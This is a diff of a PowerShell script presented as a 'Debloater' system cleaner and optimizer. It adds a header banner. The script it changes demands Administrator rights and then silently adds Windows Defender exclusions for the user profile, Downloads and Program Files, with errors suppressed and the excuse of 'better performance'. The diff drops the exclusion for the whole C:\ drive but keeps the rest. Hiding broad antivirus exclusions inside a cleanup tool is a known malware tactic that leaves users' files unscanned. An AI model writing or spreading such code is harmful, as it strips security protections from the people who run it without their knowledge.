@@ -1,3 +1,28 @@
+<# 1
+==============================================================================
+                        DEBLOATER TOOL v2.0
+                        Advanced System Cleaner & Optimizer
+
+                        Author: ! Star
+                        Features:
+                        - Temporary files cleanup
+                        - Browser cache management
+                        - Memory optimization
+                        - Startup programs management
+                        - Advanced program uninstaller
+                        - Duplicate file finder
+                        - System optimization tools
+==============================================================================
+#>
+
+#region SCRIPT INITIALIZATION & SECURITY CHECKS
+# ============================================================================
+# SCRIPT INITIALIZATION & SECURITY CHECKS
+# ============================================================================
+
+# Check if script is running with Administrator privileges
+#endregion
+
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     Write-Host "ERROR: This script must be run as Administrator!" -ForegroundColor Red
@@ -11,7 +36,6 @@ Clear-Host
 
 # Add Windows Defender exclusions for better performance
 try {
-    Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'Downloads') -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:ProgramFiles" -ErrorAction SilentlyContinue
@@ -1687,7 +1711,6 @@ function Find-EmptyFolders {
 
     # Default exclusions for system folders
     $defaultExclusions = @(
-        "C:\"
         "C:\Windows",
         "C:\Program Files",
         "C:\Program Files (x86)",
